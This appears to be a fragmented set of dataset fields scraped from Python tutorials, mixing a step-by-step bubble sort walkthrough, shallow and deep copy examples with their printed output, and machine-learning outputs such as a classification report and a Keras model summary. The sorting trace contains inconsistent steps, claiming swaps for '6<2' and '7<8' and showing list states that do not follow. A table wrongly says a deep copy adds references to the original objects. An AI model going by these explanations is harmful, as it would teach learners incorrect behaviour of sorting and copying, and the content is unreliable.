…
 6, 7, 2]', 'Here the algorithm sort the elements -', 'First iteration ', 'It compares the first two elements and here 5>3 then swap with each other. Now we get new list is - ', '[3, 5, 8, 6, 7, 2]', 'In second comparison, 5 < 8 then swapping happen -', '[3, 5, 8, 6, 7, 2]', 'In third comparison, 8>6 then swap -', '[3, 5, 6, 8, 7, 2]', 'In fourth comparison, 8>7 then swap -', '[3, 5, 6, 7, 8, 2]', 'In fifth comparison, 8>2 then swap-', '[3, 5, 6, 7, 2, 8]', 'Here the first iteration is complete and we get the largest element at the end. Now we need to the len(list1) - 1', 'Second Iteration', '[3, 5, 6, 7, 2, 8] - > [3, 5, 6, 7, 2, 8] here, 3<5 then no swap taken place', '[3, 5, 6, 7, 2, 8] - > [3, 5, 6, 7, 2, 8] here, 5<6 then no swap taken place', '[3, 5, 6, 7, 2, 8] - > [3, 5, 6, 7, 2, 8] here, 6<7 then no swap taken place', '[3, 5, 6, 7, 2, 8] - > [3, 5, 6, 2, 7, 8] here 7>2 then swap their position. Now', '[3, 5, 6, 2, 7, 8] - > [3, 5, 6, 2, 7, 8] here 7<8 then no swap taken place.', 'Third Iteration', '[3, 5, 6, 2, 7, 8] - > [3, 5, 6, 7, 2, 8] here, 3<5 then no swap taken place', '[3, 5, 6, 2, 7, 8] - > [3, 5, 6, 7, 2, 8] here, 5<6 then no swap taken place', '[3, 5, 6, 2, 7, 8] - > [3, 5, 2, 6, 7, 8] here, 6<2 then swap their positions', '[3, 5, 2, 6, 7, 8] - > [3, 5, 2, 6, 7, 8] here 6<7 then no swap taken place. Now', '[3, 5, 2, 6, 7, 8] - > [3, 5, 2, 6, 7, 8] here 7<8 then swap their position.', 'It will iterate until the list is sorted.', 'Fourth Iteration -', '[3, 5, 2, 6, 7, 8] - > [3, 5, 2, 6, 7, 8]', '[3, 5, 2, 6, 7, 8] - > [3, 2, 5, 6, 7, 8]', '[3, 2, 5, 6, 7, 8] - > [3, 2, 5, 6, 7, 8]', '[3, 2, 5, 6, 7, 8] - > [3, 2, 5, 6, 7, 8]', '[3, 2, 5, 6, 7, 8] - > [3, 2, 5, 6, 7, 8]', 'Fifth Iteration', 'Check the each element and as we can see that our list is sorted using the bubble sort technique.', 'We have already described the technique of bubble sort. Now, we will implement the logic in the Python code.', 'Explanation:', 'In the above code, we have defined a bubble_sort() function which takes list1 as an argument.', 'We can also swap the elements 
…
 copy', 'print (""The original elements:"")', 'for i in range(0,len( list1)):', 'print (list1[i],end="" "")', 'import copy', 'class Func_New:', 'def __init__(self, x, y):', 'self.x = x', 'self.y = y', 'def __repr__(self):', ""return 'Func_new(%r, %r)' % (self.x, self.y)"", 'a = Func_New(50, 56)', 'b = copy.copy(a)', 'print(a)', 'print(b)', 'print(a is b)', 'print(b is a)']","[""Old List: [[1, 2, 3], [4, 5, 4], [7, 8, 'a']]"", 'ID of Old List: 1909447368968', ""New List: [[1, 2, 3], [4, 5, 4], [7, 8, 'a']]"", 'ID of New List: 1909447368968', 'The original elements before shallow copying', '1 7 [3, 5] 8', 'The original elements after shallow copying', '1 7 [10, 5] 8', 'Old list: [[1, 2, 3], [4, 5, 6], [7, 8, 9], [10, 11, 12], [13, 14, 15]]', 'New list: [[1, 2, 3], [4, 5, 6], [7, 8, 9], [10, 11, 12]]', '[[1, 2, 3], [4, 5, 6], [7, 8, 9]]', '[[1, 2, 3], [4, 5, 6], [7, 8, 9]]', 'The original list:', '0 [1, 2] [3, 5] 4', 'The new list after deep copying:', '0 [8, 2] [3, 5] 4', 'The original elements:', '0 [1, 2] [3, 5] 4', 'Func_new(50, 56)', 'Func_new(50, 56)', 'False', 'False']",[],['|||Shallow Copy|||Deep Copy||||||A shallow copy creates a new compound object and then adds a reference to the object found in the original.|||A deep copy creates a new compound object and then adds a reference to the object found in the original.|||We can copy arbitrary objects (including custom classes) with the copy module.|||']
…
     1.00       150', 'macro avg       1.00      1.00      1.00       150', 'weighted avg       1.00      1.00      1.00       150', '[[50  0  0]', '[ 0 50  0]', '[ 0  0 50]]', 'array([[0.5, 0.71135838],', '[0.26594342, 0.11420192]])', '[ 2 12 30 56]', 'x_train shape: (60000, 28, 28, 1)', '60000 Training samples', '10000 Testing samples', 'Model: ""sequential""', '_________________________________________________________________', 'Layer (type)                 Output Shape              Param #', '=================================================================', 'conv2d (Conv2D)              (None, 26, 26, 32)        320', '_________________________________________________________________', 'max_pooling2d (MaxPooling2D) (None, 13, 13, 32)        0', '_________________________________________________________________', 'conv2d_1 (Conv2D)            (None, 11, 11, 64)        18496', '_________________________________________________________________', 'max_pooling2d_1 (MaxPooling2 (None, 5, 5, 64)          0', '_________________________________________________________________', 'flatten (Flatten)            (None, 1600)              0', '_________________________________________________________________', 'dropout (Dropout)            (None, 1600)              0', '_________________________________________________________________', 'dense (Dense)                (None, 10)                16010', '=================================================================', 'Total params: 34,826', 'Trainable params: 34,826', 'Non-trainable params: 0', '_________________________________________________________________', '0 35089116.0', '1 33087792.0', '2 42227192.0', '3 56113208.0', '4 61125684.0', '5 45541204.0', '6 21011108.0', '7 6972017.0', '8 2523046.5', '9 1342124.5', '10 950067.5625', '11 7
…
